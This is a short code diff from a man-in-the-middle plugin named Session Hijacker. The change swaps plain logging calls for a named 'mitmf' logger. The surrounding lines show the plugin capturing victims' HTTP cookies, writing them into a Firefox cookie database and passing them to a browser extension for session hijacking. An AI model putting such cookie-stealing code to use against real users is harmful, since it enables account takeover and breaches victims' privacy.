@@ -32,6 +32,8 @@ import sqlite3
 import json
 import socket
 
+mitmf_logger = logging.getLogger('mitmf')
+
 class SessionHijacker(Plugin):
 	name       = "Session Hijacker"
 	optname    = "hijack"
@@ -84,7 +86,7 @@ class SessionHijacker(Plugin):
 					cvalue = str(cookie)[eq+1:].strip()
 					self.firefoxdb(headers['host'], cname, cvalue, url, client_ip)
 
-				logging.info("%s << Inserted cookie into firefox db" % client_ip)
+				mitmf_logger.info("%s << Inserted cookie into firefox db" % client_ip)
 
 			if self.mallory:
 				if len(self.sessions) > 0:
@@ -93,12 +95,12 @@ class SessionHijacker(Plugin):
 						temp.append(session[0])
 					if headers['host'] not in temp:
 						self.sessions.append((headers['host'], headers['cookie']))
-						logging.info("%s Got client cookie: [%s] %s" % (client_ip, headers['host'], headers['cookie']))
-						logging.info("%s Sent cookie to browser extension" % client_ip)
+						mitmf_logger.info("%s Got client cookie: [%s] %s" % (client_ip, headers['host'], headers['cookie']))
+						mitmf_logger.info("%s Sent cookie to browser extension" % client_ip)
 				else:
 					self.sessions.append((headers['host'], headers['cookie']))
-					logging.info("%s Got client cookie: [%s] %s" % (client_ip, headers['host'], headers['cookie']))
-					logging.info("%s Sent cookie to browser extension" % client_ip)
+					mitmf_logger.info("%s Got client cookie: [%s] %s" % (client_ip, headers['host'], headers['cookie']))
+					mitmf_logger.info("%s Sent cookie to browser extension" % client_ip)
 
 	#def handleHeader(self, request, key, value): # Server => Client
 	#	if 'set-cookie' in request.client.headers:
@@ -108,7 +110,7 @@ class SessionHijacker(Plugin):
 	#		if self.urlMonitor.isClientLogging() is True:
 	#			self.urlMonitor.writeClientLog(request.client, request.client.headers, message)
 	#		else:
-	#			logging.info(message)
+	#			mitmf_logger.info(message)
 
 	def mallory_server(self):
 		host = ''
